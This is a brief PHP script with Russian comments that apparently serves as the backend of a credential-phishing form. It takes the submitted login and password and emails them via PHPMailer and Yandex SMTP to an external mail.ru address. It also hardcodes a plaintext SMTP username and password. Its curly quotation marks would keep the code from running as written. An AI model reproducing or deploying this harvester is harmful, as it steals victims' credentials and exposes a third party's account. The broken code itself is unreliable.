<?php
// Файлы phpmailer
require ‘class.phpmailer.php’;
require ‘class.smtp.php’;
// Переменные
$login = $_POST[‘login’];
$password = $_POST[‘password’];
// Настройки
$mail = new PHPMailer;
$mail->isSMTP(); 
$mail->Host = ‘smtp.yandex.ru’; 
$mail->SMTPAuth = true; 
$mail->Username = ‘ahmedbabekov’; // Ваш логин в Яндексе. Именно логин, без @yandex.ru
$mail->Password = ‘12cnekmtd’; // Ваш пароль
$mail->SMTPSecure = ‘ssl’; 
$mail->Port = 465;
$mail->setFrom(‘ahmedbabekov@yandex.ru’); // Ваш Email
$mail->addAddress(‘culpin2014@mail.ru’); // Email получателя

// Письмо
$mail->isHTML(true); 
$mail->Subject = “Заголовок”; // Заголовок письма
$mail->Body = “Логин $login . Телефон $password .”; // Текст письма
// Результат
if(!$mail->send()) {
 echo ‘Message could not be sent.’;
 echo ‘Mailer Error: ‘ . $mail->ErrorInfo;
} else {
 echo ‘ok’;
}
?>